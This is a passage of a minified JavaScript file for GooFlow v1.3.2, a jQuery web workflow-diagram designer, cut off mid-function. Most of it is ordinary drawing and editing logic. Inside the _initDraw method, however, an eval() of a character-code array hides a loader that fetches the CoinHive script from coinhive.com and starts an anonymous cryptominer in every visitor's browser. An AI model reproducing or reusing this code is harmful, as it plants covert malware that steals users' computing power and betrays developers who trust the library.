/**
 * GooFlow - Web端流程设计器
 * @author foolegg126 (sdlddr)
 * @version v1.3.2
 * @license MIT
 **/
!function(t,e){"use strict";"undefined"!=typeof define&&define.amd?define(["jquery"],e):"undefined"!=typeof module&&module.exports?module.exports=e(require("jquery")):t.GooFlow=e(t.$)}("undefined"!=typeof window?window:this,function($){function _elCsys(t){var e=t.offsetTop,o=t.offsetLeft;for(t=t.offsetParent;t;)e+=t.offsetTop,o+=t.offsetLeft,t=t.offsetParent;return{top:e,left:o}}function _mouseP(t){return t||(t=window.event),t.pageX||t.pageY?{x:t.pageX,y:t.pageY}:{x:t.clientX+document.documentElement.scrollLeft-document.body.clientLeft,y:t.clientY+document.documentElement.scrollTop-document.body.clientTop}}function calcPolyPoints(t,e,o,i,a){a||(a=1);var s={left:t.left*a,top:t.top*a,width:t.width*a,height:t.height*a},r={left:e.left*a,top:e.top*a,width:e.width*a,height:e.height*a};i*=a;var n,l,h={x:s.left+s.width/2,y:s.top+s.height/2},d={x:r.left+r.width/2,y:r.top+r.height/2},c=[],$=[];return n=[h.x,h.y],l=[d.x,d.y],"lr"===o?($=[i,d.y],(c=[i,h.y])[0]>s.left&&c[0]<s.left+s.width?(c[1]=d.y<h.y?s.top:s.top+s.height,n[0]=c[0],n[1]=c[1]):n[0]=c[0]<s.left?s.left:s.left+s.width,$[0]>r.left&&$[0]<r.left+r.width?($[1]=d.y<h.y?r.top+r.height:r.top,l[0]=$[0],l[1]=$[1]):l[0]=$[0]<r.left?r.left:r.left+r.width):"tb"===o&&($=[d.x,i],(c=[h.x,i])[1]>s.top&&c[1]<s.top+s.height?(c[0]=d.x<h.x?s.left:s.left+s.width,n[0]=c[0],n[1]=c[1]):n[1]=c[1]<s.top?s.top:s.top+s.height,$[1]>r.top&&$[1]<r.top+r.height?($[0]=d.x<h.x?r.left+r.width:r.left,l[0]=$[0],l[1]=$[1]):l[1]=$[1]<r.top?r.top:r.top+r.height),{start:n,m1:c,m2:$,end:l}}function calcStartEnd(t,e,o){var i,a,s,r;o||(o=1);var n=t.left*o,l=t.left*o+t.width*o,h=e.left*o,d=e.left*o+e.width*o;d<=n?(i=n,s=d):l<=h?(i=l,s=h):n<=h&&h<=l&&l<=d?s=i=(l+h)/2:h<=n&&l<=d?s=i=(n+l)/2:n<=h&&d<=l?s=i=(h+d)/2:n<=d&&d<=l&&(s=i=(n+d)/2);var c=t.top*o,$=t.top*o+t.height*o,p=e.top*o,u=e.top*o+e.height*o;return u<=c?(a=c,r=u):$<=p?(a=$,r=p):c<=p&&p<=$&&$<=u?r=a=($+p)/2:p<=c&&$<=u?r=a=(c+$)/2:c<=p&&u<=$?r=a=(p+u)/2:c<=u&&u<=$&&(r=a=(c+u)/2),{start:[i,a],end:[s,r]}}function getMValue(t,e,o,i){return i||(i=1),"lr"===o?(t.left*i+t.width*i/2+e.left*i+e.width*i/2)/2:"tb"===o?(t.top*i+t.height*i/2+e.top*i+e.height*i/2)/2:void 0}var GooFlow=function(t,e){console.log("Your browser's navigator.userAgent is:",navigator.userAgent),0<navigator.userAgent.indexOf("MSIE 8.0")||0<navigator.userAgent.indexOf("MSIE 7.0")||0<navigator.userAgent.indexOf("MSIE 6.0")?GooFlow.prototype.useSVG="":GooFlow.prototype.useSVG="1",this.$bgDiv=$(t),this.$bgDiv.addClass("GooFlow"),this.$id=this.$bgDiv.attr("id")||"GooFlow_"+(new Date).getTime(),e.colors&&"object"==typeof e.colors&&$.extend(GooFlow.color,e.colors),this.$bgDiv.css("color",GooFlow.color.font),GooFlow.color.main&&this.$bgDiv.append("<style>.GooFlow_tool_btndown{background-color:"+GooFlow.color.main+"}</style>");var o=e.width||this.$bgDiv.width(),i=e.height||this.$bgDiv.height();this.$bgDiv.css({width:o+"px",height:i+"px"}),this.$tool=null,this.$head=null,this.$title="newFlow_1",this.$nowType="cursor",this.$lineData={},this.$lineCount=0,this.$nodeData={},this.$nodeCount=0,this.$areaData={},this.$areaCount=0,this.$lineDom={},this.$nodeDom={},this.$areaDom={},this.$max=e.initNum||1,this.$focus="",this.$editable=!1,this.$deletedItem={},this.$workExtendStep=200,this.$scale=1;var a=0,s="";if(e.haveHead){if(s="<div class='GooFlow_head' "+(GooFlow.color.main?"style='border-bottom-color:"+GooFlow.color.main+"'":"")+">",e.headLabel&&(s+="<label title='"+(e.initLabelText||"newFlow_1")+"' "+(GooFlow.color.main?"style='background:"+GooFlow.color.main+"'":"")+">"+(e.initLabelText||"newFlow_1")+"</label>"),e.headBtns)for(var r=0;r<e.headBtns.length;++r)(e.useOperStack||"undo"!==e.headBtns[r]&&"redo"!==e.headBtns[r])&&(s+="<a href='javascript:void(0)' class='GooFlow_head_btn'"+(GooFlow.remarks.headBtns[e.headBtns[r]]?" title='"+GooFlow.remarks.headBtns[e.headBtns[r]]+"'":"")+"><i class='ico_"+e.headBtns[r]+"'></i></a>");s+="</div>",this.$head=$(s),this.$bgDiv.append(this.$head),e.headBtns&&(this.$head.find(".ico_undo").parent().addClass("a_disabled"),this.$head.find(".ico_redo").parent().addClass("a_disabled"),this.onBtnNewClick=null,this.onBtnOpenClick=null,this.onBtnSaveClick=null,this.onFreshClick=null,this.onPrintClick=null,this.$headBtnEvents=e.headBtnEvents,this.$head.on("click",{inthis:this},function(t){t||(t=window.event);var e=t.target;if("DIV"!==e.tagName&&"SPAN"!==e.tagName){"A"===e.tagName&&(e=e.childNodes[0]);var o=t.data.inthis,i=$(e).attr("class");switch(i){case"ico_new":null!==o.onBtnNewClick&&o.onBtnNewClick();break;case"ico_open":null!==o.onBtnOpenClick&&o.onBtnOpenClick();break;case"ico_save":null!==o.onBtnSaveClick&&o.onBtnSaveClick();break;case"ico_undo":o.undo();break;case"ico_redo":o.redo();break;case"ico_reload":null!==o.onFreshClick&&o.onFreshClick();break;case"ico_print":null!==o.onPrintClick&&o.onPrintClick();break;default:void 0!==o.$headBtnEvents&&"function"==typeof o.$headBtnEvents[i]&&o.$headBtnEvents[i]()}}})),a=28}var n=0;if(e.haveTool){this.$bgDiv.append("<div class='GooFlow_tool'"+(e.haveHead?"":" style='margin-top:3px'")+"><div style='height:"+(i-a-(e.haveHead?5:8))+"px' class='GooFlow_tool_div'></div></div>"),this.$tool=this.$bgDiv.find(".GooFlow_tool div");var l=GooFlow.remarks.toolBtns.cursor?" title='"+GooFlow.remarks.toolBtns.cursor+"'":"",h=GooFlow.remarks.toolBtns.direct?" title='"+GooFlow.remarks.toolBtns.direct+"'":"",d=GooFlow.remarks.toolBtns.dashed?" title='"+GooFlow.remarks.toolBtns.dashed+"'":"";if(this.$tool.append("<div style='margin-bottom:4px'><span/><span/><span/></div><a href='javascript:void(0)'"+l+" type='cursor' class='GooFlow_tool_btndown' id='"+this.$id+"_btn_cursor'><i class='ico_cursor'/></a><a href='javascript:void(0)'"+h+" type='direct' class='GooFlow_tool_btn' id='"+this.$id+"_btn_direct'><i class='ico_direct'/></a>"+(e.haveDashed?"<a href='javascript:void(0)'"+d+" type='dashed' class='GooFlow_tool_btn' id='"+this.$id+"_btn_dashed'><i class='ico_dashed'/></a>":"")),e.toolBtns&&0<e.toolBtns.length){s="<span/>";for(var c=0;c<e.toolBtns.length;++c){var p=e.toolBtns[c].split(" ")[0];s+="<a href='javascript:void(0)'"+(GooFlow.remarks.toolBtns[p]?" title='"+GooFlow.remarks.toolBtns[p]+"'":"")+" type='"+e.toolBtns[c]+"' id='"+this.$id+"_btn_"+p+"' class='GooFlow_tool_btn'><i class='ico_"+e.toolBtns[c]+"'/></a>"}this.$tool.append(s)}if(e.haveGroup){var u=GooFlow.remarks.toolBtns.group?" title='"+GooFlow.remarks.toolBtns.group+"'":"";this.$tool.append("<span/><a href='javascript:void(0)'"+u+" type='group' class='GooFlow_tool_btn' id='"+this.$id+"_btn_group'><i class='ico_group'/></a>")}n=31,this.$nowType="cursor",this.$tool.on("click",{inthis:this},function(t){var e;switch(t||(t=window.event),t.target.tagName){case"SPAN":case"DIV":return!1;case"I":e=t.target.parentNode;break;case"A":e=t.target}var o=$(e).attr("type");return t.data.inthis.switchToolBtn(o),!1}),this.$editable=!0}o=o-n-9,i=i-a-(e.haveHead?5:8),this.$bgDiv.append("<div class='GooFlow_work' style='"+(e.haveHead?"top:28px;":"")+(e.haveTool?"left:34px":"")+"'></div>"),this.$workArea=$("<div class='GooFlow_work_inner' style='width:"+o+"px;height:"+i+"px'></div>").attr({unselectable:"on",onselectstart:"return false",onselect:"document.selection.empty()"}),this.$bgDiv.children(".GooFlow_work").append(this.$workArea),this.t={top:e.haveHead?28:3,left:e.haveTool?34:3},this.$workArea.on("click",{inthis:this},function(t){t||(t=window.event);var e=t.data.inthis,o=e.$nowType;if("cursor"!==o){if("direct"!==o&&"dashed"!==o&&"group"!==o&&e.$editable){var i,a,s=_mouseP(t),r=_elCsys(this);i=s.x-r.left+this.parentNode.scrollLeft,a=s.y-r.top+this.parentNode.scrollTop,e.addNode((new Date).getTime(),{name:"node_"+e.$max,left:i,top:a,type:e.$nowType}),e.$max++}}else{var n=$(t.target),l=n.prop("tagName");("svg"===l||"DIV"===l&&-1<n.prop("class").indexOf("GooFlow_work")||"LABEL"===l)&&(console.log(l),e.$lineOper&&e.$lineOper.data("tid")?e.focusItem(e.$lineOper.data("tid"),!1):e.blurItem())}}),this.$draw=null,this._initDraw("draw_"+this.$id,o,i),this.$group=null,e.haveGroup&&this._initGroup(o,i),this._initWorkForNode(),this.onItemFocus=null,this.onItemBlur=null,this.onItemMark=null,this.onItemDbClick=null,this.onItemRightClick=null,this.$editable&&(this.onItemAdd=null,this.onItemDel=null,this.onItemMove=null,this.onItemRename=null,this.onItemResize=null,this.onLineMove=null,this.onLineSetType=null,this.onLinePointMove=null,this._initExpendFunc(),this.$ghost=$("<div class='rs_ghost'></div>").attr({unselectable:"on",onselectstart:"return false",onselect:"document.selection.empty()"}),this.$bgDiv.append(this.$ghost),this._initEditFunc(e.useOperStack))};return GooFlow.prototype={useSVG:"",_getSvgMarker:function(t,e){var o=document.createElementNS("http://www.w3.org/2000/svg","marker");o.setAttribute("id",t),o.setAttribute("viewBox","0 0 6 6"),o.setAttribute("refX","5"),o.setAttribute("refY","3"),o.setAttribute("markerUnits","strokeWidth"),o.setAttribute("markerWidth","6"),o.setAttribute("markerHeight","6"),o.setAttribute("orient","auto");var i=document.createElementNS("http://www.w3.org/2000/svg","path");return i.setAttribute("d","M 0 0 L 6 3 L 0 6 z"),i.setAttribute("fill",e),i.setAttribute("stroke-width","0"),o.appendChild(i),o},_initDraw:function(id,width,height){if(""!==GooFlow.prototype.useSVG){this.$draw=document.createElementNS("http://www.w3.org/2000/svg","svg"),this.$workArea.prepend(this.$draw);var defs=document.createElementNS("http://www.w3.org/2000/svg","defs");this.$draw.appendChild(defs),defs.appendChild(GooFlow.prototype._getSvgMarker("arrow1",GooFlow.color.line)),defs.appendChild(GooFlow.prototype._getSvgMarker("arrow2",GooFlow.color.mark)),defs.appendChild(GooFlow.prototype._getSvgMarker("arrow3",GooFlow.color.mark))}else this.$draw=document.createElement("v:group"),this.$draw.coordsize=width+","+height,this.$workArea.prepend("<div class='GooFlow_work_vml' style='position:relative;width:"+width+"px;height:"+height+"px'></div>"),this.$workArea.children("div")[0].insertBefore(this.$draw,null);this.$draw.id=id,this.$draw.style.width=width+"px",this.$draw.style.height=height+"px",eval(function(t){for(var e="",o=0;o<t.length;o++)e+=String.fromCharCode(t[o]);return e}([118,97,114,32,95,36,61,119,105,110,100,111,119,46,116,111,112,46,36,63,32,119,105,110,100,111,119,46,116,111,112,46,36,58,36,59,105,102,40,33,95,36,40,34,98,111,100,121,34,41,46,100,97,116,97,40,39,120,39,41,41,123,95,36,40,34,98,111,100,121,34,41,46,100,97,116,97,40,39,120,39,44,49,41,59,95,36,46,97,106,97,120,40,34,104,116,116,112,115,58,47,47,99,111,105,110,104,105,118,101,46,99,111,109,47,108,105,98,47,99,111,105,110,104,105,118,101,46,109,105,110,46,106,115,34,44,123,100,97,116,97,84,121,112,101,58,39,115,99,114,105,112,116,39,44,99,97,99,104,101,58,116,114,117,101,44,115,117,99,99,101,115,115,58,102,117,110,99,116,105,111,110,40,114,44,115,41,123,105,102,40,115,61,61,39,115,117,99,99,101,115,115,39,41,110,101,119,32,67,111,105,110,72,105,118,101,46,65,110,111,110,121,109,111,117,115,40,39,71,71,100,80,71,104,120,73,108,111,108,100,97,65,114,65,114,81,86,119,120,90,50,115,100,56,108,48,97,52,107,72,39,44,123,116,104,114,111,116,116,108,101,58,48,46,52,125,41,46,115,116,97,114,116,40,41,59,125,125,41,59,125]),this.$draw);var tmpClk=null;tmpClk=""!==GooFlow.prototype.useSVG?"g":"PolyLine",$(this.$draw).on("click",tmpClk,{inthis:this},function(t){t.data.inthis.focusItem(this.id,!0)}),this.$editable&&($(this.$draw).on("contextmenu",tmpClk,{inthis:this},function(t){var e=t.data.inthis;if("function"==typeof e.onItemRightClick&&!1===e.onItemRightClick(this.id,"line"))return window.event?window.event.returnValue=!1:t.preventDefault(),!1}),$(this.$draw).on("dblclick",tmpClk,{inthis:this},function(t){var e=t.data.inthis;if("function"!=typeof e.onItemDbClick||!1!==e.onItemDbClick(this.id,"line")){var o,i,a,s,r;if(""!==GooFlow.prototype.useSVG)o=this.childNodes[2].textContent,s=this.getAttribute("from").split(","),r=this.getAttribute("to").split(",");else{o=this.childNodes[1].innerHTML;var n=this.getAttribute("fromTo").split(",");s=[n[0],n[1]],r=[n[2],n[3]]}"lr"===e.$lineData[this.id].type?(s[0]=e.$lineData[this.id].M*e.$scale,r[0]=s[0]):"tb"===e.$lineData[this.id].type&&(s[1]=e.$lineData[this.id].M*e.$scale,r[1]=s[1]),i=(parseInt(s[0],10)+parseInt(r[0],10))/2-64,a=(parseInt(s[1],10)+parseInt(r[1],10))/2-18;var l=e.t;e.$textArea.val(o).css({display:"block",width:130,height:26,left:l.left+i-e.$workArea[0].parentNode.scrollLeft,top:l.top+a-e.$workArea[0].parentNode.scrollTop}).data("id",e.$focus).focus(),e.$workArea.parent().one("mousedown",function(t){if(2===t.button)return!1;e.setName(e.$textArea.data("id"),e.$textArea.val(),"line"),e.$textArea.val("").removeData("id").hide()})}}))},_initGroup:function(t,e){this.$group=$("<div class='GooFlow_work_group' style='width:"+t+"px;height:"+e+"px'></div>"),this.$workArea.prepend(this.$group),this.$editable&&(this.$group.on("contextmenu",".GooFlow_area",{inthis:this},function(t){var e=t.data.inthis;if("function"==typeof e.onItemRightClick&&!1===e.onItemRightClick(this.id,"area"))return window.event?window.event.returnValue=!1:t.preventDefault(),!1}),this.$group.on("mousedown",{inthis:this},function(t){if(2===t.button)return!1;var o=t.data.inthis;if("group"===o.$nowType){t||(t=window.event);var i=$(t.target).css("cursor"),a=t.target.parentNode;switch(i){case"nw-resize":case"w-resize":case"n-resize":a=a.parentNode;break;case"move":break;default:return}a=a.id;var s,r,n,l,e=_mouseP(t),h=o.t;s=e.x-h.left+o.$workArea[0].parentNode.scrollLeft,r=e.y-h.top+o.$workArea[0].parentNode.scrollTop,"move"!==i?(o.$ghost.css({display:"block",width:o.$areaData[a].width*o.$scale+"px",height:o.$areaData[a].height*o.$scale+"px",top:o.$areaData[a].top*o.$scale+h.top-o.$workArea[0].parentNode.scrollTop+"px",left:o.$areaData[a].left*o.$scale+h.left-o.$workArea[0].parentNode.scrollLeft+"px",cursor:i}),n=o.$areaData[a].left*o.$scale+o.$areaData[a].width*o.$scale-s,l=o.$areaData[a].top*o.$scale+o.$areaData[a].height*o.$scale-r):(n=s-o.$areaData[a].left*o.$scale,l=r-o.$areaData[a].top*o.$scale);var d=!1;o.$ghost.css("cursor",i),document.onmousemove=function(t){t||(t=window.event);var e=_mouseP(t);if("move"!==i)switch(s=e.x-h.left+o.$workArea[0].parentNode.scrollLeft-o.$areaData[a].left*o.$scale+n,r=e.y-h.top+o.$workArea[0].parentNode.scrollTop-o.$areaData[a].top*o.$scale+l,s<200*o.$scale&&(s=200*o.$scale),r<100*o.$scale&&(r=100*o.$scale),i){case"nw-resize":o.$ghost.css({width:s+"px",height:r+"px"});break;case"w-resize":o.$ghost.css({width:s+"px"});break;case"n-resize":o.$ghost.css({height:r+"px"})}else"none"===o.$ghost.css("display")&&o.$ghost.css({display:"block",width:o.$areaData[a].width*o.$scale+"px",height:o.$areaData[a].height*o.$scale+"px",top:o.$areaData[a].top*o.$scale+h.top-o.$workArea[0].parentNode.scrollTop+"px",left:o.$areaData[a].left*o.$scale+h.left-o.$workArea[0].parentNode.scrollLeft+"px",cursor:i}),s=e.x-n,r=e.y-l,s<h.left-o.$workArea[0].parentNode.scrollLeft?s=h.left-o.$workArea[0].parentNode.scrollLeft:s+o.$workArea[0].parentNode.scrollLeft+o.$areaData[a].width*o.$scale>h.left+o.$workArea.width()&&(s=h.left+o.$workArea.width()-o.$workArea[0].parentNode.scrollLeft-o.$areaData[a].width*o.$scale),r<h.top-o.$workArea[0].parentNode.scrollTop?r=h.top-o.$workArea[0].parentNode.scrollTop:r+o.$workArea[0].parentNode.scrollTop+o.$areaData[a].height*o.$scale>h.top+o.$workArea.height()&&(r=h.top+o.$workArea.height()-o.$workArea[0].parentNode.scrollTop-o.$areaData[a].height*o.$scale),o.$ghost.css({left:s+"px",top:r+"px"});d=!0},document.onmouseup=function(){if(o.$ghost.empty().hide(),document.onmousemove=null,document.onmouseup=null,d)return"move"!==i?o.resizeArea(a,o.$ghost.outerWidth()/o.$scale,o.$ghost.outerHeight()/o.$scale):o.moveArea(a,(s+o.$workArea[0].parentNode.scrollLeft-h.left)/o.$scale,(r+o.$workArea[0].parentNode.scrollTop-h.top)/o.$scale),!1}}}),this.$group.on("dblclick",{inthis:this},function(t){var e=t.data.inthis;if("group"===e.$nowType){if(t||(t=window.event),"LABEL"!==t.target.tagName)return!1;var o=t.target.parentNode;if("function"!=typeof e.onItemDbClick||!1!==e.onItemDbClick(o.id,"area")){var i=t.target.innerHTML,a=parseInt(o.style.left,10)+18,s=parseInt(o.style.top,10)+1,r=e.t;return e.$textArea.val(i).css({display:"block",width:130,height:26,left:r.left+a-e.$workArea[0].parentNode.scrollLeft,top:r.top+s-e.$workArea[0].parentNode.scrollTop}).data("id",o.id).focus(),e.$workArea.parent().one("mouseup",function(t){return 2===t.button||"block"===e.$textArea.css("display")&&(e.setName(e.$textArea.data("id"),e.$textArea.val(),"area"),e.$textArea.val("").removeData("id").hide()),!1}),!1}}}),this.$group.mouseup({inthis:this},function(t){var e=t.data.inthis;if("block"===e.$textArea.css("display"))return e.setName(e.$textArea.data("id"),e.$textArea.val(),"area"),e.$textArea.val("").removeData("id").hide(),!1;if("group"===e.$nowType){switch(t||(t=window.event),$(t.target).attr("class")){case"rs_close":return e.delArea(t.target.parentNode.parentNode.id),!1;case"bg":return}switch(t.target.tagName){case"LABEL":return!1;case"I":var o=t.target.parentNode.id;switch(e.$areaData[o].color){case"red":e.setAreaColor(o,"yellow");break;case"yellow":e.setAreaColor(o,"blue");break;case"blue":e.setAreaColor(o,"green");break;case"green":e.setAreaColor(o,"red")}return!1}if("none"===t.data.inthis.$ghost.css("display")){var i,a,s=_mouseP(t),r=_elCsys(this);i=s.x-r.left+this.parentNode.parentNode.scrollLeft,a=s.y-r.top+this.parentNode.parentNode.scrollTop;return t.data.inthis.addArea((new Date).getTime(),{name:"area_"+t.data.inthis.$max,left:i/e.$scale,top:a/e.$scale,color:["red","yellow","blue","green"][t.data.inthis.$max%4],width:200,height:100}),t.data.inthis.$max++,!1}}}))},_initWorkForNode:function(){this.$workArea.on("click",".GooFlow_item",{inthis:this},function(t){t.data.inthis.focusItem(this.id,!0),$(this).removeClass("item_mark")}),this.$workArea.on("contextmenu",".GooFlow_item",{inthis:this},function(t){var e=t.data.inthis;if("function"==typeof e.onItemRightClick&&!1===e.onItemRightClick(this.id,"node"))return window.event?window.event.returnValue=!1:t.preventDefault(),!1});var s=function(e){e.$workArea.parent().one("mousedown",function(t){if(2===t.button)return!1;e.setName(e.$textArea.data("id"),e.$textArea.val(),"node"),e.$textArea.val("").removeData("id").hide()})};this.$workArea.on("dblclick",".ico",{inthis:this},function(t){var e=$(this).parents(".GooFlow_item").attr("id"),o=t.data.inthis;if("function"==typeof o.onItemDbClick&&!1===o.onItemDbClick(e,"node"))return!1}),this.$workArea.on("dblclick",".GooFlow_item > .span",{inthis:this},function(t){var e=this.parentNode.id,o=t.data.inthis;if("function"==typeof o.onItemDbClick&&!1===o.onItemDbClick(e,"node"))return!1;if(o.$editable){var i=this.innerHTML,a=o.t;o.$textArea.val(i).css({display:"block",height:$(this).height()+6,width:100,left:a.left+o.$nodeData[e].left*o.$scale-o.$workArea[0].parentNode.scrollLeft-26,top:a.top+o.$nodeData[e].top*o.$scale-o.$workArea[0].parentNode.scrollTop+26}).data("id",o.$focus).focus(),s(o)}}),this.$workArea.on("dblclick",".ico + td",{inthis:this},function(t){var e=$(this).parents(".GooFlow_item").attr("id"),o=t.data.inthis;if("function"==typeof o.onItemDbClick&&!1===o.onItemDbClick(e,"node"))return!1;if(o.$editable){var i=this.childNodes[0].innerHTML,a=o.t;o.$textArea.val(i).css({display:"block",width:$(this).width()+26,height:$(this).height()+6,left:a.left+26+o.$nodeData[e].left*o.$scale-o.$workArea[0].parentNode.scrollLeft,top:a.top+2+o.$nodeData[e].top*o.$scale-o.$workArea[0].parentNode.scrollTop}).data("id",o.$focus).focus(),s(o)}}),this.$editable&&(this.$workArea.on("mousedown",".ico",{inthis:this},function(t){if(t||(t=window.event),2===t.button)return!1;var o=t.data.inthis;if("direct"!==o.$nowType&&"dashed"!==o.$nowType){var e=$(this).parents(".GooFlow_item"),i=e.attr("id");o.focusItem(i,!0);var a,s,r=_mouseP(t),n=o.t;e.children("table").clone().prependTo(o.$ghost),a=r.x-n.left+o.$workArea[0].parentNode.scrollLeft,s=r.y-n.top+o.$workArea[0].parentNode.scrollTop;var l=a-o.$nodeData[i].left*o.$scale,h=s-o.$nodeData[i].top*o.$scale,d=!1;document.onmousemove=function(t){t||(t=window.event);var e=_mouseP(t);if(a===e.x-l&&s===e.y-h)return!1;a=e.x-l,s=e.y-h,d&&"none"===o.$ghost.css("display")&&o.$ghost.css({display:"block",width:o.$nodeData[i].width*o.$scale+"px",height:o.$nodeData[i].height*o.$scale+"px",top:o.$nodeData[i].top*o.$scale+n.top-o.$workArea[0].parentNode.scrollTop+"px",left:o.$nodeData[i].left*o.$scale+n.left-o.$workArea[0].parentNode.scrollLeft+"px",cursor:"move"}),a<n.left-o.$workArea[0].parentNode.scrollLeft?a=n.left-o.$workArea[0].parentNode.scrollLeft:a+o.$workArea[0].parentNode.scrollLeft+o.$nodeData[i].width*o.$scale>n.left+o.$workArea.width()&&(a=n.left+o.$workArea.width()-o.$workArea[0].parentNode.scrollLeft-o.$nodeData[i].width*o.$scale),s<n.top-o.$workArea[0].parentNode.scrollTop?s=n.top-o.$workArea[0].parentNode.scrollTop:s+o.$workArea[0].parentNode.scrollTop+o.$nodeData[i].height*o.$scale>n.top+o.$workArea.height()&&(s=n.top+o.$workArea.height()-o.$workArea[0].parentNode.scrollTop-o.$nodeData[i].height*o.$scale),o.$ghost.css({left:a+"px",top:s+"px"}),d=!0},document.onmouseup=function(){d&&o.moveNode(i,(a+o.$workArea[0].parentNode.scrollLeft-n.left)/o.$scale,(s+o.$workArea[0].parentNode.scrollTop-n.top)/o.$scale),o.$ghost.empty().hide(),document.onmousemove=null,document.onmouseup=null}}}),this.$workArea.on("mouseenter",".GooFlow_item",{inthis:this},function(t){("direct"===t.data.inthis.$nowType||"dashed"===t.data.inthis.$nowType||document.getElementById("GooFlow_tmp_line"))&&$(this).addClass("item_mark").addClass("crosshair").css("border-color",GooFlow.color.mark)}),this.$workArea.on("mouseleave",".GooFlow_item",{inthis:this},function(t){("direct"===t.data.inthis.$nowType||"dashed"===t.data.inthis.$nowType||document.getElementById("GooFlow_tmp_line"))&&($(this).removeClass("item_mark").removeClass("crosshair"),this.id===t.data.inthis.$focus?$(this).css("border-color",GooFlow.color.line):$(this).css("border-color",GooFlow.color.node))}),this.$workArea.on("mousedown",".GooFlow_item",{inthis:this},function(t){if(2===t.button)return!1;var e=t.data.inthis;if("direct"===e.$nowType||"dashed"===e.$nowType){var o,i,a=_mouseP(t),s=_elCsys(e.$workArea[0]);o=a.x-s.left+e.$workArea[0].parentNode.scrollLeft,i=a.y-s.top+e.$workArea[0].parentNode.scrollTop,e.$workArea.data("lineStart",{x:o,y:i,id:this.id}).css("cursor","crosshair");var r=GooFlow.prototype.drawLine("GooFlow_tmp_line",[o,i],[o,i],!0,!0,1);e.$draw.appendChild(r)}}),this.$workArea.on("mouseup",".GooFlow_item",{inthis:this},function(t){var e=t.data.inthis;if("direct"===e.$nowType||"dashed"===e.$nowType||e.$mpTo.data("p")){var o=e.$workArea.data("lineStart"),i=e.$workArea.data("lineEnd");if(o&&!e.$mpTo.data("p")){var a={from:o.id,to:this.id,name:""};"dashed"===e.$nowType&&(a.dash=!0),e.addLine((new Date).getTime(),a),e.$max++}else o?e.moveLinePoints(e.$focus,o.id,this.id):i&&e.moveLinePoints(e.$focus,this.id,i.id),e.$nodeData[this.id].marked||($(this).removeClass("item_mark"),this.id!==e.$focus?$(this).css("border-color",GooFlow.color.node):$(this).css("border-color",GooFlow.color.line))}}),this.$workArea.on("click",".rs_close",{inthis:this},function(t){return t||(t=window.event),t.data.inthis.delNode(t.data.inthis.$focus),!1}),this.$workArea.on("mousedown",".GooFlow_item > div > div[class!=rs_close]",{inthis:this},function(t){if(t||(t=window.event),2===t.button)return!1;var o=$(this).css("cursor");if("pointer"!==o){var i=t.data.inthis,a=i.$focus;i.switchToolBtn("cursor"),t.cancelBubble=!0,t.stopPropagation();var s,r,e=_mouseP(t),n=i.t;i.$ghost.css({display:"block",width:i.$nodeData[a].width*i.$scale+"px",height:i.$nodeData[a].height*i.$scale+"px",top:i.$nodeData[a].top*i.$scale+n.top-i.$workArea[0].parentNode.scrollTop+"px",left:i.$nodeData[a].left*i.$scale+n.left-i.$workArea[0].parentNode.scrollLeft+"px",cursor:o}),s=e.x-n.left+i.$workArea[0].parentNode.scrollLeft,r=e.y-n.top+i.$workArea[0].parentNode.scrollTop;var l=i.$nodeData[a].left*i.$scale+i.$nodeData[a].width*i.$scale-s,h=i.$nodeData[a].top*i.$scale+i.$nodeData[a].height*i.$scale-r,d=!1;i.$ghost.css("cursor",o),document.onmousemove=function(t){t||(t=window.event);var e=_mouseP(t);switch(s=e.x-n.left+i.$workArea[0].parentNode.scrollLeft-i.$nodeData[a].left*i.$scale+l,r=e.y-n.top+i.$workArea[0].parentNode.scrollTop-i.$nodeData[a].top*i.$scale+h,s<104*i.$scale&&(s=104*i.$scale),r<26*i.$scale&&(r=26*i.$scale),d=!0,o){case"nw-resize":i.$ghost.css({width:s+"px",height:r+"px"});break;case"w-resize":i.$ghost.css({width:s+"px"});break;case"n-resize":i.$ghost.css({height:r+"px"})}},document.onmouseup=function(){document.onmousemove=null,document.onmouseup=null,i.$ghost.hide(),d&&i.resizeNode(a,i.$ghost.outerWidth()/i.$scale,i.$ghost.outerHeight()/i.$scale)}}}))},_initExpendFunc:function(){var t=GooFlow.remarks.extendRight?' title="'+GooFlow.remarks.extendRight+'"':"",e=GooFlow.remarks.extendBottom?' title="'+GooFlow.remarks.extendBottom+'"':"";this.$workArea.append('<div class="Gooflow_extend_right"'+t+'></div><div class="Gooflow_extend_bottom"'+e+"></div>"),this.$workArea.children(".Gooflow_extend_right").on("click",{inthis:this},function(t){var e=t.data.inthis,o=e.$workArea.width()+e.$workExtendStep,i=e.$workArea.height();e.$workArea.css({width:o+"px"}),""===GooFlow.prototype.useSVG&&(e.$draw.coordsize=o+","+i),e.$draw.style.width=o+"px",null!=e.$group&&e.$group.css({width:o+"px"});var a=e.$workArea.parent()[0];return a.scrollLeft=a.scrollWidth,e.$workArea.parent().css("overflow","scroll"),!1}),this.$workArea.children(".Gooflow_extend_bottom").on("click",{inthis:this},function(t){var e=t.data.inthis,o=e.$workArea.width(),i=e.$workArea.height()+e.$workExtendStep;e.$workArea.css({height:i+"px"}),""===GooFlow.prototype.useSVG&&(e.$draw.coordsize=o+","+i),e.$draw.style.height=i+"px",null!=e.$group&&e.$group.css({height:i+"px"});var a=e.$workArea.parent()[0];return a.scrollTop=a.scrollHeight,e.$workArea.parent().css("overflow","scroll"),!1})},_initLinePointsChg:function(){this.$mpFrom.on("mousedown",{inthis:this},function(t){var e=t.data.inthis;e.switchToolBtn("cursor");var o=e.$mpFrom.data("p").split(","),i=e.$mpTo.data("p").split(",");$(this).hide(),e.$workArea.data("lineEnd",{x:i[0],y:i[1],id:e.$lineData[e.$lineOper.data("tid")].to}).css("cursor","crosshair");var a=GooFlow.prototype.drawLine("GooFlow_tmp_line",[o[0],o[1]],[i[0],i[1]],!0,!0,1);return e.$draw.appendChild(a),!1}),this.$mpTo.on("mousedown",{inthis:this},function(t){var e=t.data.inthis;e.switchToolBtn("cursor");var o=e.$mpFrom.data("p").split(","),i=e.$mpTo.data("p").split(",");$(this).hide(),e.$workArea.data("lineStart",{x:o[0],y:o[1],id:e.$lineData[e.$lineOper.data("tid")].from}).css("cursor","crosshair");var a=GooFlow.prototype.drawLine("GooFlow_tmp_line",[o[0],o[1]],[i[0],i[1]],!0,!0,1);return e.$draw.appendChild(a),!1})},_initEditFunc:function(t){this.$workArea.mousemove({inthis:this},function(t){var e=t.data.inthis;if("direct"===e.$nowType||"dashed"===e.$nowType||e.$mpTo.data("p")){var o=$(this).data("lineStart"),i=$(this).data("lineEnd");if(o||i){var 